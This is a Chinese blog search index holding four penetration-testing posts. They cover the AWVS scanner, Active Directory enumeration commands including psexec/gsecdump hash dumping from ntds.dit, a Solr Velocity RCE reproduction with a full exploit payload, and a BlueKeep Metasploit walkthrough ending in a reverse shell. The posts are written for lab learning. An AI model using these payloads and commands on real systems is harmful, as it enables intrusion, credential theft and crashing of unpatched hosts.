<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>AWVS的基本使用</title>
    <url>/posts/22917.html</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Acunetix Web Vulnerability Scanner（简称AWVS）是一款知名的网络漏洞扫描工具，它通过网络爬虫测试你的网站安全，检测流行安全漏洞。（下面用的是AWVS10.5）<br><img src="http://pp64r48ul.bkt.clouddn.com/AWVS2.png" alt></p>
<h1 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h1><h2 id="Site-Crawler"><a href="#Site-Crawler" class="headerlink" title="Site Crawler"></a>Site Crawler</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS3.png" alt></p>
<p>点击Start对所输入的URL进行爬取，但是有的页面需要登录，不登录有些文件爬不到，就可以选择可以登录的login sequence进行登录（login sequence在处Application Settings处详细说明）,爬网结果可以保存下来，以便后续站点扫描使用。</p>
<h2 id="Target-Finder"><a href="#Target-Finder" class="headerlink" title="Target Finder"></a>Target Finder</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS4.png" alt></p>
<p>可以指定IP地址段进行端口扫描（类似于Nmap），可以用于信息收集。<br>进行了端口扫描后会进行服务发现，得到端口上对应的服务。</p>
<h2 id="Subdomain-Scanner"><a href="#Subdomain-Scanner" class="headerlink" title="Subdomain Scanner"></a>Subdomain Scanner</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS5.png" alt></p>
<p>用DNS进行域名解析，找域名下的子域及其主机名（用于信息收集） </p>
<h2 id="Blind-SQL-Injector"><a href="#Blind-SQL-Injector" class="headerlink" title="Blind SQL Injector"></a>Blind SQL Injector</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS6.png" alt></p>
<p>在相应参数位置按+添加注入点，让AWVS进行注入探测，可以dump有sql漏洞的数据库内容。</p>
<h2 id="HTTP-Editor"><a href="#HTTP-Editor" class="headerlink" title="HTTP Editor"></a>HTTP Editor</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS7.png" alt><br>和BP repeater类似，可以进行手动漏洞挖掘探测。</p>
<p><strong>Enocoder tool中可以进行各种加密解密</strong></p>
<p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS8.png" alt></p>
<h2 id="HTTP-Sniffer"><a href="#HTTP-Sniffer" class="headerlink" title="HTTP Sniffer"></a>HTTP Sniffer</h2><p>和BP proxy类似，首先要设置代理(Application Settings-&gt;HTTP Sniffer)，截取数据包，修改数据包提交或者丢弃。</p>
<p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS9.png" alt></p>
<p>手动设置代理<br><img src="http://pp64r48ul.bkt.clouddn.com/AWVS10.png" alt></p>
<h2 id="HTTP-Fuzzer"><a href="#HTTP-Fuzzer" class="headerlink" title="HTTP Fuzzer"></a>HTTP Fuzzer</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS11.png" alt></p>
<p>类似于BP intruder，进行暴力破解，点击+选择类型，点击insert插入 </p>
<ul>
<li>注意：插入字母的时候选取字母的范围填写的是字母对应的ASCII码。</li>
</ul>
<h2 id="Authentication-Tester"><a href="#Authentication-Tester" class="headerlink" title="Authentication Tester"></a>Authentication Tester</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS12.png" alt></p>
<p>认证测试，用于尝试破解破解账户密码。 </p>
<p>基于表单的认证方法要点击Select 选择表单的哪一部分是用户名，哪一部分是密码。</p>
<h2 id="Compare-Results"><a href="#Compare-Results" class="headerlink" title="Compare Results"></a>Compare Results</h2><p>可以用不同用户登录后结果进行比较，和BP Compare类似。</p>
<h1 id="Configuration"><a href="#Configuration" class="headerlink" title="Configuration"></a>Configuration</h1><h2 id="Application-Settings"><a href="#Application-Settings" class="headerlink" title="Application Settings"></a>Application Settings</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS13.png" alt></p>
<ul>
<li>Client Certifications：有些Web Application需要客户端证书才能进行扫描。 </li>
<li>Login Sequence Manger：类似于把登陆过程进行录像。AVWS站点扫描中可以选择login sequence、在Site Crawling处也可以选择login sequence</li>
</ul>
<h2 id="Scan-Settings"><a href="#Scan-Settings" class="headerlink" title="Scan Settings"></a>Scan Settings</h2><p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS14.png" alt></p>
<ul>
<li>Google hacking database基于搜索引擎的信息收集：谷歌黑客数据库，但需要设置代理（LAN Settings）。</li>
</ul>
<h1 id="站点扫描"><a href="#站点扫描" class="headerlink" title="站点扫描"></a>站点扫描</h1><ul>
<li>点击New Scan</li>
</ul>
<p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS15.png" alt></p>
<ul>
<li>点击扫描配置就是Scan Setting页面</li>
</ul>
<p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS16.png" alt></p>
<ul>
<li>发现目标服务器基本信息</li>
</ul>
<p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS17.png" alt></p>
<ul>
<li>是否需要登录，可以使用login sequence</li>
</ul>
<p><img src="http://pp64r48ul.bkt.clouddn.com/AWVS18.png" alt></p>
<ul>
<li>finish，扫描结果可以保存为wvs文件，还能把结果制作成报表<br><img src="http://pp64r48ul.bkt.clouddn.com/AWVS19.png" alt></li>
</ul>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>Active_Directory</title>
    <url>/posts/35642.html</url>
    <content><![CDATA[<h1 id="Active-Directory-活动目录"><a href="#Active-Directory-活动目录" class="headerlink" title="Active Directory(活动目录)"></a>Active Directory(活动目录)</h1><p><strong>Active Directory</strong>（简称AD。）是微软Windows Server中，负责架构中大型网路环境的集中式目录管理服务（Directory Services），在Windows 2000 Server开始内建于Windows Server产品中，它处理在组织中的网路物件，物件可以是使用者，群组，电脑，网域控制站，邮件，设定档，组织单元，树系等等，只要是在Active Directory结构定义档（schema）中定义的物件，就可以储存在Active Directory资料档中，并利用Active Directory Service Interface来存取。</p>
<h2 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h2><p>Active Directory(AD)以树状的资料结构来组成网路服务的资讯，在简单的网路环境中（例如小公司），通常网域都只有一个，在中型或大型的网路中，网域可能会有很多个，或是和其他公司或组织的AD相互连结（此连结称为信任关系）。</p>
<p><img src="/posts/35642/1.png" alt></p>
<h3 id="物件"><a href="#物件" class="headerlink" title="物件"></a>物件</h3><p>Active Directory的最小储存单元为物件（object），每个物件均有自己的schema属性，可以储存不同的资料，像是使用者、群组、电脑、信箱或其他的基本物件等。</p>
<p>一个网域底下的基本物件有：</p>
<ul>
<li>Domain Controllers，储存网域所属的网域控制站（简称DC、域控）。</li>
<li>Computers，储存加入网域的电脑物件。</li>
<li>Builtin，储存内建的帐户群组。</li>
<li>Users，储存AD中的使用者物件。</li>
</ul>
<p>域与活动目录的关系：</p>
<ul>
<li>域是一种逻辑的组织形式；</li>
<li>活动目录是实现域的方法</li>
<li>活动目录是域的基础</li>
</ul>
<h2 id="WMIEXEC"><a href="#WMIEXEC" class="headerlink" title="WMIEXEC"></a>WMIEXEC</h2><p>内网渗透中经常用到psexec这个工具，可以很方便的得到一个半交互式的cmd shell。</p>
<p>psexec 首次执行需要验证，这在Shell中使用起来非常不便，可以使用如下命令，避免出面上述问题</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">psexec &#x2F;accepteula</span><br></pre></td></tr></table></figure>
<p>但是psexec也有一些问题：psexec需要对方开启ADMIN$共享，而且需要安装服务，安装服务会留下明显的日志；另外，psexec退出时有可能服务删除失败。</p>
<p>WMI可以远程执行命令可以用VBS脚本调用WMI来模拟psexec的功能。</p>
<p><img src="/posts/35642/2.png" alt></p>
<p>WMIEXEC支持两种模式，一种是半交互式shell模式，另一种是执行单条命令模式。</p>
<p>WMIEXEC需要提供账号密码进行远程连接，但是如果没有破解出账号密码，也可以配合WCE的hash注入功能一起使用，先进行hash注入，然后再使用WMIEXEC即可。</p>
<p><strong>半交互式shell模式</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cscript.exe &#x2F;&#x2F;nologo wmiexec.vbs &#x2F;shell 192.168.72.14 username password</span><br></pre></td></tr></table></figure>

<p><img src="/posts/35642/3.png" alt></p>
<p><strong>单个命令执行的模式</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cscript.exe wmiexec.vbs &#x2F;cmd 192.168.1.1 username password &quot;command&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/35642/4.png" alt></p>
<p>下载地址： <a href="http://www.secpulse.com/wp-content/uploads/2015/05/cache-a360611dc24d240989799c29c555e4b7_wmiexec-v1_1.rar" target="_blank" rel="noopener">wmiexec v1.1.rar</a></p>
<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><table>
<thead>
<tr>
<th align="center">命令</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">echo</td>
<td align="center">查看系统版本位数</td>
</tr>
<tr>
<td align="center">set</td>
<td align="center">查看系统环境变量</td>
</tr>
<tr>
<td align="center">netstat -ano</td>
<td align="center">查看开放端口</td>
</tr>
<tr>
<td align="center">ipconfig /all</td>
<td align="center">查询本机IP段，所在域等</td>
</tr>
<tr>
<td align="center">net config Workstation</td>
<td align="center">当前计算机名，全名，用户名，系统版本，工作站域，登陆域</td>
</tr>
<tr>
<td align="center">net user</td>
<td align="center">本机用户列表</td>
</tr>
<tr>
<td align="center">net localhroup administrators</td>
<td align="center">本机管理员[通常含有域用户]</td>
</tr>
<tr>
<td align="center">net user /domain</td>
<td align="center">查询域用户</td>
</tr>
<tr>
<td align="center">net user 用户名 /domain</td>
<td align="center">获取指定用户的账户信息</td>
</tr>
<tr>
<td align="center">net user /domain b404 pass</td>
<td align="center">修改域内用户密码，需要管理员权限</td>
</tr>
<tr>
<td align="center">net group /domain</td>
<td align="center">查询域里面的工作组</td>
</tr>
<tr>
<td align="center">net group 组名 /domain</td>
<td align="center">查询域中的某工作组</td>
</tr>
<tr>
<td align="center">net group “domain admins” /domain</td>
<td align="center">查询域管理员列表</td>
</tr>
<tr>
<td align="center">net group “enterprise admins” /domain</td>
<td align="center">获得企业管理员列表</td>
</tr>
<tr>
<td align="center">net group 组名 /del /domain</td>
<td align="center">删除域中的某组</td>
</tr>
<tr>
<td align="center">net group 组名 组成员名 /del /domain</td>
<td align="center">删除域中的某组的组成员</td>
</tr>
<tr>
<td align="center">net localgroup administrators /domain</td>
<td align="center">登录本机的域管理员</td>
</tr>
<tr>
<td align="center">net group 组名 /add</td>
<td align="center">增加域中的组</td>
</tr>
<tr>
<td align="center">net localgroup administrators workgroup\user001 /add</td>
<td align="center">域用户添加到本机</td>
</tr>
<tr>
<td align="center">net group “domain controllers” /domain</td>
<td align="center">查看域控制器(如果有多台)</td>
</tr>
<tr>
<td align="center">net time /domain</td>
<td align="center">判断主域，主域服务器都做时间服务器</td>
</tr>
<tr>
<td align="center">net session</td>
<td align="center">查看当前会话</td>
</tr>
<tr>
<td align="center">net use \ip\ipc$ pawword /user:username@domain</td>
<td align="center">建立IPC会话[空连接-***]</td>
</tr>
<tr>
<td align="center">net view</td>
<td align="center">查询同一域内机器列表</td>
</tr>
<tr>
<td align="center">net view /domain</td>
<td align="center">查询域列表</td>
</tr>
<tr>
<td align="center">net view \ip</td>
<td align="center">查询某IP共享</td>
</tr>
<tr>
<td align="center">net view /domain:test</td>
<td align="center">查看test域中计算机列表</td>
</tr>
<tr>
<td align="center">net view \DC的机器名字</td>
<td align="center">查看域控共享情况</td>
</tr>
<tr>
<td align="center">net use z: \192.168.200.21\文件夹名</td>
<td align="center">建立映射到本机Z盘</td>
</tr>
<tr>
<td align="center">net share</td>
<td align="center">查看SMB指向的路径[即共享]</td>
</tr>
<tr>
<td align="center">at \192.168.200.21:50 c:\windows\xx.exe</td>
<td align="center">在共享主机上执行</td>
</tr>
<tr>
<td align="center">nltest /domain_trusts</td>
<td align="center">获取域信任信息</td>
</tr>
<tr>
<td align="center">net start</td>
<td align="center">查看当前运行的服务</td>
</tr>
<tr>
<td align="center">net time /domain</td>
<td align="center">查询主域服务器的时间</td>
</tr>
<tr>
<td align="center">net time \192.168.200.21</td>
<td align="center">查看192.168.200.21机器的时间</td>
</tr>
<tr>
<td align="center">echo %logonserver%</td>
<td align="center">查看登陆到这台服务器的计算机</td>
</tr>
<tr>
<td align="center">net accounts</td>
<td align="center">查看本地密码策略</td>
</tr>
<tr>
<td align="center">nbtstat –A ip</td>
<td align="center">netbios 查询</td>
</tr>
<tr>
<td align="center">netstat –an/ano/anb</td>
<td align="center">网络连接查询</td>
</tr>
<tr>
<td align="center">netsh firewall show config</td>
<td align="center">查看防火墙策略</td>
</tr>
<tr>
<td align="center">netsh firewall show state</td>
<td align="center">查看防火墙策略</td>
</tr>
<tr>
<td align="center">route print</td>
<td align="center">路由表</td>
</tr>
<tr>
<td align="center">tracert IP</td>
<td align="center">路由跟踪</td>
</tr>
<tr>
<td align="center">arp -a</td>
<td align="center">列出本网段内所有活跃的IP地址</td>
</tr>
<tr>
<td align="center">arp -s (ip + mac)</td>
<td align="center">绑定mac和IP</td>
</tr>
<tr>
<td align="center">arp -d (iP + mac)</td>
<td align="center">解绑IP和Mac</td>
</tr>
<tr>
<td align="center">tasklist /V</td>
<td align="center">查看进程[显示对应用户]</td>
</tr>
<tr>
<td align="center">tasklist /S ip /U domain\username /P /V</td>
<td align="center">查看远程计算机进程列表</td>
</tr>
<tr>
<td align="center">psexec \192.168.200.21 -u administrator -p b404pass -c gsecdump.exe -u</td>
<td align="center">从域服务器密码存储文件windows/ntds/ntds.dit导出hash值出来</td>
</tr>
<tr>
<td align="center">gsecdump -a</td>
<td align="center">获取域登管理员登录过得hash值，这里gescdump为第三方导出AD域的hash值</td>
</tr>
<tr>
<td align="center">tasklist /S IP地址 /U 域名\用户名 /P /V</td>
<td align="center">查看远程计算机进程</td>
</tr>
<tr>
<td align="center">tasklist /svc</td>
<td align="center">查看进程</td>
</tr>
<tr>
<td align="center">taskkill /im 进程名称(cmd.exe)</td>
<td align="center">结束进程</td>
</tr>
<tr>
<td align="center">taskkill /pid[进程码]</td>
<td align="center">-t(结束该进程) -f(强制结束该进程以及所有子进程)</td>
</tr>
<tr>
<td align="center">ping 主机名</td>
<td align="center">显示IP</td>
</tr>
<tr>
<td align="center">qprocess *</td>
<td align="center">类似tasklist</td>
</tr>
<tr>
<td align="center">qprocess /SERVER:IP</td>
<td align="center">远程查看计算机进程列表</td>
</tr>
<tr>
<td align="center">nslookup –qt-MX Yahoo.com</td>
<td align="center">查看邮件服务器</td>
</tr>
<tr>
<td align="center">whoami /all</td>
<td align="center">查询当前用户权限等</td>
</tr>
<tr>
<td align="center">systeminfo</td>
<td align="center">查看系统信息</td>
</tr>
<tr>
<td align="center">qwinsta</td>
<td align="center">查看登录情况</td>
</tr>
<tr>
<td align="center">qwinsta /SERVER:IP</td>
<td align="center">查看远程登录情况</td>
</tr>
<tr>
<td align="center">fsutil fsinfo drives</td>
<td align="center">查看所有盘符</td>
</tr>
<tr>
<td align="center">gpupdate /force</td>
<td align="center">更新域策略</td>
</tr>
</tbody></table>
<p><strong>dsquery的AD查询工具</strong></p>
<table>
<thead>
<tr>
<th align="center">命令</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">dsquery user domainroot -limit 65535 &amp;&amp; net user /domain</td>
<td align="center">列出该域内所有用户名</td>
</tr>
<tr>
<td align="center">dsquery contact</td>
<td align="center">寻找目录中的联系人</td>
</tr>
<tr>
<td align="center">dsquery subnet</td>
<td align="center">列出该域内网段划分</td>
</tr>
<tr>
<td align="center">query user</td>
<td align="center">查询那些用户在线</td>
</tr>
<tr>
<td align="center">dsquery group &amp;&amp; net group /domain</td>
<td align="center">列出该域内分组</td>
</tr>
<tr>
<td align="center">dsquery ou</td>
<td align="center">列出该域内组织单位</td>
</tr>
<tr>
<td align="center">dsquery server &amp;&amp; net time /domain</td>
<td align="center">列出该域内域控制器</td>
</tr>
<tr>
<td align="center">dsquery site -o rdn</td>
<td align="center">搜索域中所有站点的名称</td>
</tr>
<tr>
<td align="center">psloggedon.exe</td>
<td align="center">查询那台主机和用户登录到该主机上</td>
</tr>
<tr>
<td align="center">netsess.exe //192.168.1.115</td>
<td align="center">远程主机上无需管理员权限,查询到主机名和用户</td>
</tr>
<tr>
<td align="center">reg query “HKEY_CURRENT_USER\SOFTWARE\MICROSOFT\TERMINAL SERVERCLIENT\DEFAULT”</td>
<td align="center">获取最近mstsc登录的记录</td>
</tr>
</tbody></table>
<p>更多命令查看： <a href="https://www.t00ls.net/articles-39285.html" target="_blank" rel="noopener">《内网命令大全》</a></p>
]]></content>
  </entry>
  <entry>
    <title>Apache Solr Velocity Template RCE漏洞复现</title>
    <url>/posts/57536.html</url>
    <content><![CDATA[<h2 id="0x00-Apache-Solr介绍"><a href="#0x00-Apache-Solr介绍" class="headerlink" title="0x00 Apache Solr介绍"></a>0x00 Apache Solr介绍</h2><p>Solr是一个独立的企业级搜索应用服务器，它对外提供类似于Web-service的API接口。用户可以通过http请求，向搜索引擎服务器提交一定格式的XML文件，生成索引；也可以通过Http Get操作提出查找请求，并得到XML格式的返回结果。</p>
<h2 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h2><p>Solr中存在VelocityResponseWriter组件,攻击者可以构造特定请求修改相关配置,使VelocityResponseWriter组件允许加载指定模板,进而导致Velocity模版注入远程命令执行漏洞，攻击者利用该漏洞可以直接获取到服务器权限。</p>
<p>漏洞产生原因:</p>
<p>当攻击者可以直接访问Solr控制台时，可以通过发送类似/节点名/config的POST请求对该节点的配置文件做更改Apache Solr默认集成VelocityResponseWriter插件，在该插件的初始化参数中的params.resource.loader.enabled这个选项是用来控制是否允许参数资源加载器在Solr请求参数中指定模板，默认设置是false。当设置params.resource.loader.enabled为ture时，将允许用户通过设置请求中的参数来指定相关资源加载，这也就意味着攻击者可以通过构造一个具有威胁的攻击请求，在服务器上进行命令执行。</p>
<h2 id="0x02-漏洞影响版本"><a href="#0x02-漏洞影响版本" class="headerlink" title="0x02 漏洞影响版本"></a>0x02 漏洞影响版本</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Apache Solr 5.x -- 8.2.0，存在config API版本</span><br></pre></td></tr></table></figure>

<h2 id="0x03-漏洞环境搭建"><a href="#0x03-漏洞环境搭建" class="headerlink" title="0x03 漏洞环境搭建"></a>0x03 漏洞环境搭建</h2><p><strong>启动vulhub环境：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;vulhub&#x2F;solr&#x2F;CVE-2019-0193-RCE</span><br><span class="line"></span><br><span class="line">docker-compose build</span><br><span class="line"></span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
<p>创建一个名为test的Core:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo docker-compose exec solr bash bin&#x2F;solr create_core -c test -d example&#x2F;example-DIH&#x2F;solr&#x2F;db</span><br></pre></td></tr></table></figure>
<p>访问<a href="http://ip:8983，当前solr版本为8.1.1">http://ip:8983，当前solr版本为8.1.1</a><br>![](Apache Solr Velocity Template RCE漏洞复现/1.png)</p>
<h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04 漏洞利用"></a>0x04 漏洞利用</h2><p>漏洞利用前提：攻击者需要知道Solr服务中Core的名称才能执行攻击</p>
<p>如下图所示，Core的名称为test</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.72.14:8983&#x2F;solr&#x2F;#&#x2F;~cores&#x2F;test</span><br></pre></td></tr></table></figure>
<p>![](Apache Solr Velocity Template RCE漏洞复现/2.png)</p>
<p>访问：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.72.14:8983&#x2F;solr&#x2F;test&#x2F;config</span><br></pre></td></tr></table></figure>
<p>抓包修改GET请求为POST,POST内容如下（修改Core的配置）<br>![](Apache Solr Velocity Template RCE漏洞复现/3.png)<br>利用公开的EXP测试：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;select?q&#x3D;1&amp;&amp;wt&#x3D;velocity&amp;v.template&#x3D;custom&amp;v.template.custom&#x3D;%23set($x&#x3D;%27%27)+%23set($rt&#x3D;$x.class.forName(%27java.lang.Runtime%27))+%23set($chr&#x3D;$x.class.forName(%27java.lang.Character%27))+%23set($str&#x3D;$x.class.forName(%27java.lang.String%27))+%23set($ex&#x3D;$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out&#x3D;$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end</span><br></pre></td></tr></table></figure>
<p>![](Apache Solr Velocity Template RCE漏洞复现/4.png)</p>
<p>查看ls<br>![](Apache Solr Velocity Template RCE漏洞复现/5.png)</p>
<h2 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h2><p><a href="https://github.com/vulhub/vulhub/tree/master/solr/CVE-2019-0193" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/solr/CVE-2019-0193</a></p>
<p><a href="https://github.com/veracode-research/solr-injection#7-cve-2019-xxxx-rce-via-velocity-template-by-_s00py" target="_blank" rel="noopener">https://github.com/veracode-research/solr-injection#7-cve-2019-xxxx-rce-via-velocity-template-by-_s00py</a></p>
<p><a href="https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt" target="_blank" rel="noopener">https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt</a></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2019-0708本地复现</title>
    <url>/posts/16205.html</url>
    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>CVE-2019-0708是微软于2019年5月14日发布的一个严重的RDP远程代码执行漏洞。该漏洞无需身份认证和用户交互，可能形成蠕虫爆发。该服务器漏洞利用方式是通过远程桌面端口3389，RDP协议进行攻击的 。</p>
<p>2019年09月07日，@rapid7 在其metasploit-framework仓库公开发布了CVE-2019-0708的利用模块，漏洞利用工具已经开始扩散，已经构成了蠕虫级的攻击威胁。</p>
<h2 id="0x01-影响版本"><a href="#0x01-影响版本" class="headerlink" title="0x01 影响版本"></a>0x01 影响版本</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Windows 7</span><br><span class="line">Windows server 2008</span><br><span class="line">Windows server 2008 R2</span><br><span class="line">Windows 2003</span><br><span class="line">Windows XP</span><br></pre></td></tr></table></figure>
<h2 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Windows server 2008 R2   IP: 192.168.72.140</span><br><span class="line">kali Linux</span><br></pre></td></tr></table></figure>

<h3 id="Windows-server-2008-R2"><a href="#Windows-server-2008-R2" class="headerlink" title="Windows server 2008 R2"></a>Windows server 2008 R2</h3><p><strong>开启3389</strong><br><img src="/posts/16205/1.png" alt></p>
<p><strong>修改注册表</strong><br><code>Win + R</code> 输入 <code>regedit</code> 进入注册表编辑器，按以下目录找到 <code>fDisableCam</code> 并将值改为0</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\TerminalServer\Winstations\RDP-Tcp\fDisableCam &#x3D; 0</span><br></pre></td></tr></table></figure>
<p><img src="/posts/16205/2.png" alt></p>
<h3 id="kali-Linux"><a href="#kali-Linux" class="headerlink" title="kali Linux"></a>kali Linux</h3><p><strong>下载文件</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;TinToSer&#x2F;bluekeep-exploit</span><br></pre></td></tr></table></figure>
<p><img src="/posts/16205/3.png" alt><br>可以看到有四个.rb后缀的文件，接下来将它们放至相应的目录（rdp目录需要自己创建）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd bluekeep-exploit</span><br><span class="line">cp rdp.rb &#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;lib&#x2F;msf&#x2F;core&#x2F;exploit&#x2F;</span><br><span class="line">cp rdp_scanner.rb &#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;modules&#x2F;auxiliary&#x2F;scanner&#x2F;rdp&#x2F;</span><br><span class="line">cp cve_2019_0708_bluekeep.rb &#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;modules&#x2F;auxiliary&#x2F;scanner&#x2F;rdp&#x2F;</span><br><span class="line">cp cve_2019_0708_bluekeep_rce.rb &#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;modules&#x2F;exploits&#x2F;windows&#x2F;rdp&#x2F;</span><br></pre></td></tr></table></figure>

<h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h2><p><strong>启动msf</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
<p><img src="/posts/16205/4.png" alt></p>
<p><strong>重新加载所有模块</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reload_all</span><br></pre></td></tr></table></figure>
<p><img src="/posts/16205/5.png" alt><br><strong>搜索漏洞模块</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">search cve_2019_0708</span><br></pre></td></tr></table></figure>
<p><img src="/posts/16205/6.png" alt></p>
<p><strong>开始利用</strong></p>
<p>使用 <code>use exploit/windows/rdp/cve_2019_0708_bluekeep_rce</code> 启用0708RDP攻击模块</p>
<p>使用 <code>info</code> 可以查看工具相关信息以及设置<br><img src="/posts/16205/7.png" alt></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可以看到我们需要设置的选项主要为RHOSTS \ RPORT \ target</span><br><span class="line">使用set RHOSTS 设置靶机IP</span><br><span class="line"></span><br><span class="line">使用set RPORT 设置靶机PORT</span><br><span class="line"></span><br><span class="line">使用set target ID数字（可选为1-4）每种都代表了机器架构</span><br><span class="line">在我的复现环境中使用VMWare，所以使用target 3即可，如若不行尝试使用1，2，4</span><br></pre></td></tr></table></figure>
<p>使用 <code>show options</code> 查看设置情况</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf5 exploit(windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit&#x2F;windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce):</span><br><span class="line"></span><br><span class="line">   Name             Current Setting  Required  Description</span><br><span class="line">   ----             ---------------  --------  -----------</span><br><span class="line">   RDP_CLIENT_IP    192.168.0.100    yes       The client IPv4 address to report during connect</span><br><span class="line">   RDP_CLIENT_NAME  ethdev           no        The client computer name to report during connect, UNSET &#x3D; random</span><br><span class="line">   RDP_DOMAIN                        no        The client domain name to report during connect</span><br><span class="line">   RDP_USER                          no        The username to report during connect, UNSET &#x3D; random</span><br><span class="line">   RHOSTS                            yes       The target address range or CIDR identifier</span><br><span class="line">   RPORT            3389             yes       The target port (TCP)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic targeting via fingerprinting</span><br></pre></td></tr></table></figure>
<p><strong>更改设置</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set rhosts 192.168.10.10  &#x2F;&#x2F;设置目标主机（win server 2008 R2）</span><br><span class="line">set rport 3389   &#x2F;&#x2F;设置目标端口（此处不用设置）</span><br><span class="line">set target 3</span><br></pre></td></tr></table></figure>
<p><img src="/posts/16205/8.png" alt></p>
<p>设置完参数之后，使用 <code>run</code> 开启攻击<br><img src="/posts/16205/9.png" alt></p>
<p>反弹shell成功！！！</p>
<h2 id="0x04-遇到的问题"><a href="#0x04-遇到的问题" class="headerlink" title="0x04 遇到的问题"></a>0x04 遇到的问题</h2><ol>
<li><p>加载模块失败</p>
<p>出现了 <code>WARNING! The following modules could not be loaded!</code> 错误，提示我们新加入的模块无法被加载。</p>
<p>这个问题我一开始在网上也没找到相关的解决办法，我是直接安装的 <code>2019.03</code> 版本的，没在出现这个问题。</p>
<p>后来在网上看到这篇文章貌似可以： <a href="https://blog.csdn.net/weixin_42380348/article/details/100642788" target="_blank" rel="noopener">https://blog.csdn.net/weixin_42380348/article/details/100642788</a></p>
</li>
<li><p>每次攻击出现蓝屏，然后靶机关机</p>
<p>设置完参数之后，开始攻击run，靶机出现蓝屏，然后关机<br><img src="/posts/16205/10.png" alt></p>
<p>kali出现<br><img src="/posts/16205/11.png" alt></p>
<p>这里可以将参数 <code>target</code> 设置为其他ID，我是设置为2，然后run。</p>
</li>
</ol>
